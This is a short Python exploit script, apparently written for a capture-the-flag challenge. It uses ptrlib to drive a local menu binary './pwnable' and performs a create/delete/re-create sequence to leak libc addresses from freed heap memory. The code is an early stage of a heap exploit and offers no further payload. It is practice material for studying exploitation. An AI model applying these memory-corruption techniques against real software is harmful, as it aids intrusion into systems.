from ptrlib import *

def create(topic):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("topic: ")
    sock.sendline(topic)

def set_desc(topic, size, desc):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("topic: ")
    sock.sendline(topic)
    sock.recvuntil("length: ")
    sock.sendline(str(size))
    sock.recvuntil("Desc: ")
    sock.sendline(desc)

def delete(topic):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("topic: ")
    sock.sendline(topic)

def show(topic):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil(topic)
    sock.recvuntil(" - ")
    desc = sock.recvline().rstrip()
    return desc

sock = Process("./pwnable")

# leak libc
create(b"A" * 8)
set_desc(b"A" * 8, 0xf8, b"desc here")
delete(b"A" * 8)
create(b"A" * 8)
print(show(b"A" * 8))

